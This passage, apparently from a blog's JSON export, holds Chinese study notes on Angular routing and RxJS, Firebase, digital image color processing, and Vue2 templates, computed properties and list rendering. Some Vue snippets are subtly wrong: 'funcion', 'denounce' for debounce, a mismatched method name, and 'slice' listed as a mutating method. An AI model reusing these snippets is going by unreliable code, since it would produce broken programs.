路由理论上路由貌似应该是一个全局的东西，当用户在浏览器中，或者在页面上点击某个链接时，根据链接中的 path，从路由表中查到对应的组件，然后展示该组件（有点类似后端的路由，只是后端的路由是调用某个视图函数，而前端变成了调用某个视图组件）； 貌似是一个内置的组件，用来展示路由返回的结果 RouterModule 的方法 forRoot，用来添加路由表； routerLink 属性用来在 HTML 页面上的 标签中指定路由路径； 定义路径时，可以用冒号来表示变量，例如 “&#x2F;detail&#x2F;:id”，此处 id 是一个变量； 当用户点击某个包含 routerLink 属性的链接时，路由器将接受到事件对象，并跳转到对应的组件，之后组件有可能需要接受参数数据来完成初始化，此时需要用到 ActivatedRoute 对象来获得所需的参数数据； 示例：ActivatedRoute.snapshot.paramMap.get(“id”) 但是有时候可能该参数很大，例如是一个对象，此时该如何传递数据呢？ 当用户从 A 组件页面跳转到 B 组件页面后，如果需要返回原来的 A 组件页面，貌似有两种方法，一种是在 B 页面上面放置 A 页面的链接。这种方法需要多一些工作量；如果此时能够记住原来的页面栈，而用一个通用返回方法，回到页面栈的上一层就会非常的方便，此时需要用到一个内置的 Location 服务，来获得该页面栈； 添加路由的过程 创建：创建 routing 路由模块；通过 CLI 创建时，它会自动在 app 根模块中引入路由模块； 映射：路由模块中定义路径和组件的映射关系，以便当用户点击或在浏览器中输入路径时，可以展示相应的组件；记得定义一个默认路径，让其重定向到指定的路径； 展示：在需要展示组件的位置，添加内置的 router-outlet 组件，它会将路由返回的组件展示出来；一般此时还会在 HTML 页面上添加导航，以便在不同的版块之间切换； 链接：给需要进行跳转的组件添加 routerLink 属性，当用户点击时，实现跳转； HTTP 通过引入内置的 HttpClient 模块，可以实现发送 HTTP 请求；由于请求返回的结果是异步的，因此 angular 使用 RxJS 库来处理异步，RxJS 将请求结果封装为 Observable 对象，有点类似 promise，可以调用该对象的 subscribe 方法，来获得异步返回的数据； HttpClient 拥有常见的各种请求方法，例如 get&#x2F;post&#x2F;put&#x2F;delete 等，它的调用方式有点特别，需要使用类似 C++ 中的泛型来定义返回数据的类型，例如： HttpClient.get&lt;Hero[]&gt;(url)，此处 url 为参数，不同的请求方法，接受的参数个数不同；所有的请求方法都会返回一个 RxJS 中的 Observable 对象； RxJS 的 Observable 对象有一个 pipe 方法，该方法可用来将多个函数组合成一个函数。当条件满足时，该组合函数会被触发（调用），然后它会依次执行组合中的各个函数；例如： 12345return this.http.get&lt;Hero&gt;(url).pipe( tap(_ =&gt; this.log(`fetched hero id=$&#123;id&#125;`)), catchError(this.handleError&lt;Hero&gt;(`getHero id=$&#123;id&#125;`))); 此处的 tap 和 catchError 都是内置函数，但是它们的执行场景不同，tap 一定会执行，而 catchError 仅在 HTTP Response 报错的情况下才会执行；这两个函数都接受一个回调函数做为其参数，并在得到 Response 后，调用该回调函数； 因此，在 HttpClient 请求中结合 pipe，我们就可以对返回的结果加入一些我们想要实现的额外操作，例如 log 和错误处理等； RxJS 有很多内置方法（称为 operator），例如 map, tap, catchError 等，这些内置方法可以很方便的实现一些常用的功能，详细可查看官方文档：https://rxjs.dev/api RxJS 库中还有另外一个特别的东西叫 Subject，本质上它是一个特定类型的 Observable 对象，因此它同样支持 Observable 的各种方法，它的作用原理很像是一个 EventEmitter，它有一个 next 方法，当调用该方法时，给它传递一个参数，然后就会触发之前通过 pipe 传递进去的那些函数，示例如下： 1234567891011121314151617// 初始化一个 Subject 对象searchTerm = new Subject&lt;string&gt;();// 调用 Subject 的 pipe 方法，放入回调函数heroes$ = searchTerm.pipe( // 在用户输入关键字后，等待 300 毫秒，如果用户没有继续输入，再触发关键字搜索 debounceTime(300), // 如果输入和之前的关键字相同，则不触发搜索 distinctUntilChanged(), // 当关键字变化时，切换到新的搜索结果 switchMap((term: string) =&gt; this.heroService.searchHeroes(term)),)// 定义事件处理函数，当事件发生时，调用 Subject 对象的 next 方法，传递最新的参数数据search(term: string): void &#123; this.searchTerm.next(term);&#125; 由于 Observable 的 pipe 方法返回的是一个 Observable 对象，因此这里加了特殊的符号 heroes$ 来表示该类型，而不是直接用 heroes 的常见变量名，这也直接导致随后在 Component 的 HTML 模板中绑定该变量时，需要使用 angular 内置的 async 来处理，示例如下： 1&lt;li *ngFor=&quot;let hero of heroes$ | async&quot;&gt;&lt;/li&gt; 常用命令创建 组件：ng generate component 服务：ng generate service 模块：ng generate module –flat –module&#x3D;app –flat：表示不需要为该模块创建单独的文件夹，而是放在根文件夹下面，即 src&#x2F;app 文件夹中； –module&#x3D;app：表示将该模块注册登录在 AppModule 模块中（即在 AppModule 模块中 import）； 启动调试服务器ng serve –open","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Firebase","slug":"Firebase","date":"2021-11-04T01:28:00.000Z","updated":"2024-09-21T23:14:19.403Z","comments":true,"path":"2021/11/04/Firebase/","permalink":"http://example.com/2021/11/04/Firebase/","excerpt":"","text":"Firebase 就像名字中所携带的 base 字样透露出的信息，它是一个数据库；Firebase 是 Google 提供的一个 Baas 云产品（Backend as a service 后端服务化）；Firebase 将数据库的常用操作封装成一个库，开发者可以在前端代码中直接调用，与数据库进行交互，这样一来就省去了传统后端应用的开发，由前端直接跟数据库打交道； 适用场景：在轻量化应用中，Firebase 可以大大节省开发的工作量；但它也意味着将原来的后端逻辑全部搬到前端了，而前端是运行在浏览器中的，有可能不适合运行一些密集运算，另外也将整个应用的逻辑全部暴露出来，并非所有的应用都适合该场景； 开发者通过 Firebase SDK 也 Google 服务器直接交互，因此在使用 Firebase 之前，需要先在 Google 控制台申请 API 账号，然后在 SDK 中使用该账号；这带来一个有趣的问题，显然该账号信息是不能传输到前端的，那么要如何保持私密性呢？貌似仍然不可避免需要有一个后端服务来处理这个事情；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"数字图像处理","slug":"数字图像处理","date":"2021-10-20T02:20:00.000Z","updated":"2024-09-22T23:08:41.994Z","comments":true,"path":"2021/10/20/数字图像处理/","permalink":"http://example.com/2021/10/20/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/","excerpt":"","text":"数字图像基础视觉感知要素人的主观亮度是进入人眼的光线强度的对数函数，并且在暗光环境和亮光环境下，该函数有所不同；两个函数有交叉的部分。当人眼从一个光线环境切换到另外一个光线环境时，眼睛需要有一个适应的过程，此时人眼会调整自身的光线灵敏度，来完成这种适应； 韦伯比：光线变化量与变化前的光线强度的比值 delta I &#x2F; I；在低照明环境，韦伯比比较大（说明此时人眼较不敏感）；在高照明环境下，韦伯比降低（说明此时人眼对光线变化变得更加敏感了）； 在背景照明（即环境光线）恒定时，人眼可辨别的亮度级别是有限的（12-24级左右），但是当人眼开始移动时，背景照明会跟着变化，因此导致人眼能够辨别很大的亮度范围； 当背景照明变化时，由于人眼会重新适应和调整自己，因此这时在变化的边缘区域，会出现有趣的现象，此时人眼的感知不是线性的，而是会出现小范围的波动（上冲和下冲现象，马赫带效应）； 人眼对某个区域的亮度判断，并不完全取决于该区域的光线强度，还跟该区域所处的背景强相关；如果背景是暗的，则物体看起来更白；如果背景是亮的，则物体看起来变暗； 光和电磁波谱光是一种电磁波，不同的电磁波有不同的波长和频率，频率越高的电磁波，其携带的能量越大，此时波长也相应的越短；人眼可感知的光的波长范围大概在 0.43 - 0.79 um 之间； 除了频率（波长）外，有三个指标可用来描述光的属性： 发光强度：光源发出的能量总量，单位瓦特 W； 光通量：观察者从光源感受到的能量，单位流明数 lm； 亮度：观察者对感知到的光的主观描绘参数，个体之间存在差异，因此不可度量（大致相当于强度描述）； 图像感知和获取基本原理：使用传感器，将光的能量转换成电压变化的波形，再解析波形成为数字信号； i 表示入射分量，表示环境光源；r 表示反射分量，表示目标物体的反射光，取值范围为 0-1，表示对环境光源的全反射到全吸收之间的范围；公式中的取值范围是理论上的，现实生活中不可能存在无穷大的光源，不同环境中的光源强度总是在有限的范围内； 图像取样和量化由于传感器输出的是连续的电压波形，因此需要进一步做取样和量化动作，以便将这些波形数据数字化； 对比度：照片中最高和最低灰度级间的灰度差； 最大可度量灰度和最小可度量灰度构成了图片的动态范围；最小可度量灰度跟噪声有关； 分辩率：单位距离的线或点的总数量；印刷行业一般用点数，即 dpi（dot per inch）； 彩色图像处理传感器有很多种类型，不同类型的感光特性不同；同一感光材料，对不同波长的敏感度不同；波长越长的电磁波，进入材料越深，因此有更大的可能性被吸收，导致最终结果是光电转换率更低； 不同颜色的电磁波，在感光材料上面的光电转换效率： 原始的传感器数据是马赛克形式的，因此首先需要进行插值计算，去除马赛克，得到每一个像素点的三通道值；有很多种去除马赛克的算法，最简单的办法是取邻近点的平均值，缺点是物体边缘会不够锐利；更好的算法会稍微复杂一点，例如考虑变化幅度，当变化幅度超过临界点时，可以判断该点属于物体的边缘，因此只取纵向或横向的平均值（有些算法还会考虑该点所处的位置，例如是角点、边点、还是中间点等情况）； 饱和度：指相对的纯净度，即一种颜色混合白光的数量；纯色是全饱和的，加了白色后变成次饱和的；饱和度和所加的白光数量成反比； 曝光：场景中某些物体表面由于反射的光线少，可能很暗，因此需要延长传感器接收光线的时间，这样才能收集到足够多的信息，得以看清该物体的细节；但是延长传感器的工作时间是一把双刃剑，因为此时画面中也有可能存在比较明亮的物体（反射光线多），如果延长传感器工作的时间，则会导致明亮物体区域接收到过多的光线值，如果该值超过了上限，则会导致该明亮物体最终呈现为白色，丢失了细节；因此，选择合适的曝光时间，尽量多的保留画面中核心区域的细节，是一个不可缺少的环节； 白平衡：环境光源是多种多样的，不同的环境光源，其不同波长的电磁波组成不同，因此在该环境中，物体会出现色差；有时这种色差正是我们所需要的，但有时候则不是我们想要的。白平衡的目标，就是换出环境光源各部分光线的构成比例，并加予干预调节，让其回归到某个标准光源环境的光线比例，从而让画面中的物体，能够展示在标准光源环境下的色彩；通常白平衡并没有直接调整传感器的模拟信号值，而是调整模拟信号转换后的数字信号值，对每个通道使用不同系数进行调整； 白天日光环境下 RGB 光波的比例坐标： RIMM RGB: Reference Input&#x2F;Output Medium Metric RGB 白平衡后的数字信号，到最终显示结果之间，有三个动作需要做： 将数字信号转成颜色模型； 色阶调整（因为需要考虑最终结果的观看环境跟拍摄环境不同，例如图片观看多数在室内，而拍摄通常在室外） 转换成显示设备的颜色模型； 不同的数码相机，这三个步骤有不同的处理算法，并且它们之间不一定有明确的分界线； 传感器收集到的原始数据，需要转换为颜色值，此时需要采用某种能够表示色彩的模型；理想情况下，针对不同的环境光线，相机应使用不同的计算公式，计算出对应的色值；但在实际应用中，该步骤一般直接使用白平衡补偿后的数据；虽然这种做法可以让中性色物体恢复到正常的色值，但其他颜色则无法还原准确；理论上相机系统可以根据白平衡参数，计算出光源类型，然后再调用最合适的色彩计算模型进行色值计算； 由于人眼对颜色的感知跟人眼所处的环境光线有直接关系，因此在计算色值前，需要考虑最终的图片将在何种光线环境下被查看，并基于该查看环境，来计算合适的色值；通常情况下，会假设存在一个统一的查看环境，将基于该环境进行计算；但有时对于专业摄影场景，则省去该计算步骤，保留原值，让摄像者在后期进行自定义处理； 相机所采用的颜色模型可以是设备无关的，例如 CIEXYZ 或者 CIELab，但也可以是设备相关的，例如 RIMM RGB 模型； 经过白平衡计算后的色值，需要进一步考虑曝光参数，计算出曝光校正后的色值， 非纯性的曝光数据 -&gt; 查 LUT 表转成纯性的曝光数据 -&gt; 颜色校正Matrix，得到 XYZ 色值 -&gt; RIMM 转换Matrix，得到线性 RIMM RGB 色值 -&gt; 查 LUT 表，转成非线性的 RIMM RGB 值；在实际计算时，中间过程的两个矩阵可以合并成一个矩阵； 然后再按以下公式转成非线性的 RGB； 色阶调整照片的观看环境通常与拍摄环境不同，前者通常在室内（光线较暗），拍摄则通常在室外（光线较亮），因此在处理照片数据时，需要有一个色阶调整的环节，通过增加对比度，让照片通常在较暗的环境看得清楚； 大脑在观看照片时，存在一个心理学现象，即会强化某种现象，例如脑海中的草的颜色，会比现实中的更加鲜艳（纯度更高）； 照片的动态范围，通常要比实际生活中的更小一些，因此在做照片的处理时，需要丢弃一些动态范围信息（即对信息进行压缩）； RIMM 与 ROMM 的映射图 输出模型照片最终要在某种显示设备上进行展示，因此最后一个环节需要将数据转成目标设备的颜色模型，目前国际标准是采用 sRGB 模型。这个模型的优点是通用性很强，几乎所有的显示设备都支持。缺点是它显示的颜色范围较小，因此可能无法满足一些高端显示设备的要求；如果已知目标设备，则此步可以将照片直接转成目标设备所使用的颜色模型，而不是通过 sRGB； 第一步：将非线性的 ROMM RGB 值转成线性的； 第二步：将线性 ROMM RGB 转在 D50 XYZ 值； 第三步：将 D50 XYZ 转成 D65 XYZ 第四步：将 D65 XYZ 转成线性的 RGB 值 第五步：将线性 RGB 转成非线性的 RGB 注：其中第2步到第4步的三个矩阵运算，可以合并成一个矩阵 因此，整个计算过程可以简化为 LUT - Matrix - LUT 三部曲；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"图像处理","slug":"图像处理","permalink":"http://example.com/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}]},{"title":"Vue2","slug":"Vue2","date":"2021-08-04T01:57:00.000Z","updated":"2024-09-21T23:19:12.624Z","comments":true,"path":"2021/08/04/Vue2/","permalink":"http://example.com/2021/08/04/Vue2/","excerpt":"","text":"收获 在实例化 Vue 对象时，data 属性所引用的 data 对象的属性，在实例时就固定下来了；即如果后续给 data 对象添加的新属性，并不会出现在 Vue 对象中； 在 HTML 标签上可以使用 v-bind 等指令，来将某个标签的属性值和某个 vue 对象的属性值进行绑定； 在 input 标签上使用 v-model 指令，可以实现在输入框中，对 vue 对象属性值的修改，从而实现双向绑定； 组件绑定的对象，如果使用了 Object.freeze 方法处理过，则绑定将失效，即对象属性的更新，将不再会反应到视图上面； 生命周期钩子Vue 实例由若干个阶段组成它的生命周期，它带来一些内置的方法，可以在这些阶段插入一些想要实现的函数，即所谓的钩子，包括 created、mounted、updated、destroyed 等； 模板语法插值文本用双大括号绑定 Vue 实例的 data；如果在 HTML 标签上添加 v-once 属性，则插值只会赋值一次，之后不会动态更新； 123&lt;span&gt;Message: &#123;&#123; msg &#125;&#125;&lt;/span&gt;&lt;span v-once&gt;这个将不会改变: &#123;&#123; msg &#125;&#125;&lt;/span&gt; 原始 HTML当 Vue 实例的 data 不是普通的字符串，而是原始 html 格式字符串时，如果使用常规的双大括号，这些 html 格式的字符串，将被当成普通的文本处理；此时需要改成给标签增加 v-html 属性来绑定值，它才会被当作 HTML 处理； 123&lt;p&gt;Using mustaches: &#123;&#123; rawHtml &#125;&#125;&lt;/p&gt; &lt;p&gt;Using v-html directive: &lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt; Attribute双大括号的写法，无法将 data 值赋给 HTML 标签的属性，此时需要使用 v-bind 指令来达到预期效果 123&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt;&lt;!---或者也可以直接写成如下格式---&gt;&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 使用 javascript 表达式在双大括号的内部，除了给绑定 data 值外，也是可以使用 javascript 表达式的； 1234567&#123;&#123; number + 1 &#125;&#125; &#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125; &#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125; &lt;div v-bind:id=&quot;&#x27;list-&#x27; + id&quot;&gt;&lt;/div&gt; 指令“指令”指的是在 HTML 标签中使用 v- 前缀的特殊属性；除了 v-for 外，指令的值应为单个 javascript 表达式；它的作用是当表达式的值发生改变时，能够将新值作用于 DOM 元素，使其产生预期的变化； 1&lt;p v-if=&quot;seen&quot;&gt;现在你看到我了&lt;/p&gt; 参数有些指令能够接收参数，用来将表达式与参数所代表的属性值或者事件进行绑定 123&lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt;&lt;a v-on:click=&quot;doSomething&quot;&gt;...&lt;/a&gt; 动态参数参数早期是一个静态的字符串，如果想让它变成动态的，则可以通过增加中括号来实现；这个时候参数实际上是一个表达式，通过表达式的求值，获得绑定目标，一般来说，这个目标应该是字符串类型的值，除了 null 外，其他非字符串的结果都会引发错误； 另外表达式存在一些约束，例如不能使用空格或者引号、不能使用大写字符来定义键名（会被强制转化小写，可能导致表达式求值失败）； 1&lt;a v-bind:[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt; 修饰符指令允许接以点号为标记的后缀，用来表达该指令需要以特殊的方式进行绑定； 例如：.prevent 修饰符告诉 v-on 指令对于触发的事件调用 event.preventDefault()： 1&lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;...&lt;/form&gt; 缩写v-bind 缩写12345678&lt;!-- 完整语法 --&gt; &lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;!-- 缩写 --&gt; &lt;a :href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;!-- 动态参数的缩写 (2.6.0+) --&gt; &lt;a :[key]=&quot;url&quot;&gt; ... &lt;/a&gt; v-on 缩写12345678&lt;!-- 完整语法 --&gt; &lt;a v-on:click=&quot;doSomething&quot;&gt;...&lt;/a&gt; &lt;!-- 缩写 --&gt; &lt;a @click=&quot;doSomething&quot;&gt;...&lt;/a&gt; &lt;!-- 动态参数的缩写 (2.6.0+) --&gt; &lt;a @[event]=&quot;doSomething&quot;&gt; ... &lt;/a&gt; 计算属性和侦听器双大括号适合用来放置一些简单的变量，虽然它也支持内置表达式，但是如果表达式很长，或者逻辑比较复杂，则看起来比较困难，此时可以使用 Vue 实例中的 computed 属性，在这个属性中，同样可以内置变量，但这些变量实际上是函数，当 HTML 标签绑定到这些变量后，它实际上是会执行函数并将最终结果赋值给标签； 1234&lt;div id=&quot;example&quot;&gt; &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt; &lt;p&gt;Computed reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt; &lt;/div&gt; 1234567891011var vm = new Vue(&#123; el: &#x27;#example&#x27;, data: &#123; message: &#x27;Hello&#x27; &#125;, computed: &#123; // 计算属性的 getter reversedMessage: function () &#123; // `this` 指向 vm 实例 return this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125;&#125;); 计算属性 vs 方法事实上，前面的例子，也可以通过给 HTML 标签绑定 Vue 实例的方法来实现； 1&lt;p&gt;Reversed message: &quot;&#123;&#123; reversedMessage( ) &#125;&#125;&quot;&lt;/p&gt; 1234567var vm = new Vue(&#123; methods: &#123; reverseMessage: function () &#123; return this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125;&#125;); 虽然二者的结果是相同的，但是背后却有所区别；如果是绑定 Vue 实例的方法，每次访问变量，都会执行方法计算结果；但计算属性则使用缓存来返回结果，直到所绑定的标签发生变化后，才会重新求值，因此它的性能更加好；对于简单的计算二者区别不明显，但是如果计算量很大，则可能产生明显差别； 计算属性 vs 监听属性监听属性可以用来监听 data 中的属性值变化，当发生变化时，就会调用提前写好的监听函数；当有某个变量是由多个其他变量合成的时候，则将该变量放置在计算属性中是更加简单的做法； 1&lt;div id=&quot;demo&quot;&gt;&#123;&#123; fullName &#125;&#125;&lt;/div&gt; 1234567891011121314151617// 监听属性的做法var vm = new Vue(&#123; el: &#x27;#demo&#x27;, data: &#123; firstName: &#x27;Foo&#x27;, lastName: &#x27;Bar&#x27;, fullName: &#x27;Foo Bar&#x27; &#125;, watch: &#123; firstName: function (val) &#123; this.fullName = val + &#x27; &#x27; + this.lastName &#125;, lastName: function (val) &#123; this.fullName = this.firstName + &#x27; &#x27; + val &#125; &#125; &#125;)； 12345678910111213// 计算属性的做法var vm = new Vue(&#123; el: &#x27;#demo&#x27;, data: &#123; firstName: &#x27;Foo&#x27;, lastName: &#x27;Bar&#x27; &#125;, computed: &#123; fullName: function () &#123; return this.firstName + &#x27; &#x27; + this.lastName; &#125; &#125;&#125;); 计算属性的 setter计算属性默认只有 getter，但其实它也支持 setter 的做法； 1234567891011121314computed: &#123; fullName: &#123; // getter get: function () &#123; return this.firstName + &#x27; &#x27; + this.lastName &#125;, // setter set: function (newValue) &#123; var names = newValue.split(&#x27; &#x27;) this.firstName = names[0] this.lastName = names[names.length - 1] &#125; &#125; &#125; 侦听器可以用来监听实例 data 属性中某个变量值的变化；当监听到某个变量值变化时，相应的函数就会被触发；大多数情况下使用计算属性更合适，但偶尔有时候，使用侦听属性更方便；监听器特别适合用来执行一些异步或计算开销大的函数； 1234&lt;div id=&quot;watch-example&quot;&gt; &lt;p&gt; Ask a yes/no question: &lt;input v-model=&quot;question&quot;&gt; &lt;/p&gt; &lt;p&gt;&#123;&#123; answer &#125;&#125;&lt;/p&gt; &lt;/div&gt; 123456789101112131415161718192021222324252627282930var watchExampleVM = new Vue(&#123; el: &#x27;#watch-example&#x27;, data: &#123; question: &#x27;&#x27;, answer: &#x27;I cannot give you an answer until you ask a question!&#x27; &#125;, watch: &#123; // 如果 `question` 发生改变，这个函数就会运行 question: function (newQuestion, oldQuestion) &#123; this.answer = &#x27;Waiting for you to stop typing...&#x27;; this.debouncedGetAnswer(); &#125; &#125;, created: function () &#123; // 初始化时，调用 lodash 的 denounce，生成一个限制频率的新函数； this.denounceGetAnswer = _.denounce(this.getAnswer, 500); &#125;, methods: &#123; getAnswer: funcion () &#123; this.answer = &#x27;Thinking...&#x27; var vm = this; axios.get(&#x27;https://yesno.wtf/api&#x27;) .then(function (response) &#123; vm.answer = _.capitalize(response.data.answer) &#125;) .catch(function (error) &#123; vm.answer = &#x27;Error! Could not reach the API. &#x27; + error &#125;); &#125; &#125;&#125;); Class 与 Style 绑定绑定 HTML class使用 v-bind 进行表达式与属性的绑定时，表达式的计算结果是字符串，多数情况下这是OK的，但是如果是要动态的改变 CSS 的 Class 时，拼接字符串就显得麻烦而且容易出错；此时可以通过给 v-bind:class 传递一个对象，来实现对 CSS Class 的动态增加和减少（即让 HTML 是否拥有哪几个 Class）； 123&lt;div v-bind:class=&quot;&#123; active: isActive &#125;&quot;&gt;&lt;/div&gt;&lt;!-- 当 isActive 的值为 true 时，div 就拥有 active 类，等同如下写法，否则没有 --&gt;&lt;div class=&quot;active&quot;&gt;&lt;/div&gt; 另外上面的例子，还可以写成如下的样子 1&lt;div v-bind:class=&quot;classObj&quot;&gt;&lt;/div&gt; 1234567var vm = new Vue(&#123; data: &#123; classObj: &#123; active: isActive &#125; &#125;&#125;); 甚至 classObj 还可以放在计算属性中，实现更高级和复杂的场景； 1&lt;div v-bind:class=&quot;classObj&quot;&gt;&lt;/div&gt; 12345678910data: &#123; isActive: true&#125;,computed: &#123; classObj: function () &#123; return &#123; active: this.isActive &#125; &#125;&#125; 数组语法除了对象外，v-bind:class 还支持数组类型的值，以实现同时绑定多个 class 1&lt;div v-bind:class=&quot;[activeClass, errorClass]&quot;&gt;&lt;/div&gt; 1234data: &#123; activeClass: &#x27;active&#x27;, errorClass: &#x27;text-danger&#x27;&#125; 用在组件上在定义组件时，允许在 template 上面提前写入一些 class，之后在引用组件时，还可以再定义 class，此时的定义不会覆盖前面的定义； 123Vue.component(&#x27;my-component&#x27;, &#123; template: &#x27;&lt;p class=&quot;foo bar&quot;&gt;Hi&lt;/p&gt;&#x27; &#125;); 1&lt;my-component class=&quot;baz boo&quot;&gt;&lt;/my-component&gt; 最终的渲染结果如下： 1&lt;p class=&quot;foo bar baz boo&quot;&gt;Hi&lt;/p&gt; 绑定内联样式对象语法1&lt;div v-bind:style=&quot;styleObject&quot;&gt;&lt;/div&gt; 1234567// 除了绑定 data，也可以绑定计算属性 computeddata: &#123; styleObject: &#123; color: &#x27;red&#x27;, fontSize: &#x27;13px&#x27; &#125; &#125; 数组语法1&lt;div v-bind:style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt; 自动添加前缀如果某些 CSS 样式需要根据不同的浏览器格式要求，添加相应的前缀，例如 transform，该工作会由 Vue 自动侦测并处理； 多重值支持数组提供多个备用值，Vue 会自动检查哪个值适用，如果都不适用，则使用最后那一个； 1&lt;div :style=&quot;&#123; display: [&#x27;-webkit-box&#x27;, &#x27;-ms-flexbox&#x27;, &#x27;flex&#x27;] &#125;&quot;&gt;&lt;/div&gt; 条件渲染v-if12&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt; &lt;h1 v-else&gt;Oh no 😢&lt;/h1&gt; 如果需要对多个 HTML 元素实现条件切换，则可以使用 把这些元素包起来形成一个组； 12345&lt;template v-if=&quot;ok&quot;&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;Paragraph 1&lt;/p&gt; &lt;p&gt;Paragraph 2&lt;/p&gt; &lt;/template&gt; v-else-if如果有多个条件分支，则可以使用 v-else-if 1234&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt; 用 key 管理可复用的元素对于在 if-else 中重复出现的部分，Vue 会对其进行复用，以提高渲染的速度；如果有些情况复用是不必要的，则可以通过给每个标签增加不同 key 来实现； 12345678&lt;template v-if=&quot;loginType === &#x27;username&#x27;&quot;&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input placeholder=&quot;Enter your username&quot; key=&quot;username-input&quot;&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input placeholder=&quot;Enter your email address&quot; key=&quot;email-input&quot;&gt; &lt;/template&gt; v-showv-if 用来决定是否渲染，v-show 则一定会渲染元素，但控制它是否显示；当某个元素可能出现频繁的切换时，使用 v-show 更加合理，性能开销更小； 列表渲染v-forv-for 可以用来基于某个数组渲染出元素的列表 123&lt;ul id=&quot;example-1&quot;&gt; &lt;li v-for=&quot;item in items&quot; :key=&quot;item.message&quot;&gt; &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; 123456789var example1 = new Vue(&#123; el: &#x27;#example-1&#x27;, data: &#123; items: [ &#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125; ] &#125; &#125;); 除了 item 外，v-for 还支持增加一个 index 参数，另外可以在 v-for 中访问父作用域的属性值 12345&lt;ul id=&quot;example-2&quot;&gt; &lt;li v-for=&quot;(item, index) in items&quot;&gt; &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; 12345678910var example2 = new Vue(&#123; el: &#x27;#example-2&#x27;, data: &#123; parentMessage: &#x27;Parent&#x27;, items: [ &#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125; ] &#125; &#125;); 在 v-for 里使用对象v-for 除了可以用遍历数组外，还可以用来遍历对象的属性 12345&lt;ul id=&quot;v-for-object&quot; class=&quot;demo&quot;&gt; &lt;li v-for=&quot;value in object&quot;&gt; &#123;&#123; value &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 12345678910new Vue(&#123; el: &#x27;#v-for-object&#x27;, data: &#123; object: &#123; title: &#x27;How to do lists in Vue&#x27;, author: &#x27;Jane Doe&#x27;, publishedAt: &#x27;2016-04-10&#x27; &#125; &#125; &#125;); 类似数组支持 index 作为第二个参数，对象也支持键名作为第二个参数，index 作为第三个参数 123&lt;div v-for=&quot;(value, name) in object&quot;&gt; &#123;&#123; name &#125;&#125;: &#123;&#123; value &#125;&#125;&lt;/div&gt; 123&lt;div v-for=&quot;(value, name, index) in object&quot;&gt; &#123;&#123; index &#125;&#125;. &#123;&#123; name &#125;&#125;: &#123;&#123; value &#125;&#125; &lt;/div&gt; 维护状态默认情况下，当 v-for 所绑定的数组的数据发生变动时，v-for 会更新原生成的列表，但是为了提高渲染速度，它不是按照数组里面的新顺序来重新生成列表的，而是会复用原列表的顺序，然后仅仅替换其中的数据，这意味着列表的顺序仍然是旧的，只有数据是新的； 如果列表的顺序与数组的顺序保持一致，则需要给 v-for 增加一个 key 属性（应为字符串类型或数组类型的值） 123&lt;div v-for=&quot;item in items&quot; v-bind:key=&quot;item.id&quot;&gt; &lt;!-- 内容 --&gt; &lt;/div&gt; 一般来说，在使用 v-for 时，尽量同时使用 v-bind:key，因为这样的输出结果符合大多数情况下的预期； 数组更新检测变更方法数组有一些内置的方法，这些方法会改掉原有数组的内容； push pop shift unshift reverse sort slice 非变更方法以下方法不会改变原有的数组，而是返回一个新的数组 concat filter slice 显示过滤&#x2F;排序后的结果如果想在不改变原有数组的情况下，显示一个过滤或排序后的数组，则可以考虑使用计算属性 1&lt;li v-for=&quot;n in evenNumbers&quot;&gt;&#123;&#123; n &#125;&#125;&lt;/li&gt; 12345678910data: &#123; numbers: [ 1, 2, 3, 4, 5 ]&#125;, computed: &#123; evenNumbers: function () &#123; return this.numbers.filter(function (number) &#123; return number % 2 === 0 &#125;); &#125;&#125; 在 v-for 里面使用值范围123&lt;div&gt; &lt;span v-for=&quot;n in 10&quot;&gt;&#123;&#123; n &#125;&#125; &lt;/span&gt; &lt;/div&gt; 在 上使用 v-for123456&lt;ul&gt; &lt;template v-for=&quot;item in items&quot;&gt; &lt;li&gt;&#123;&#123; item.msg 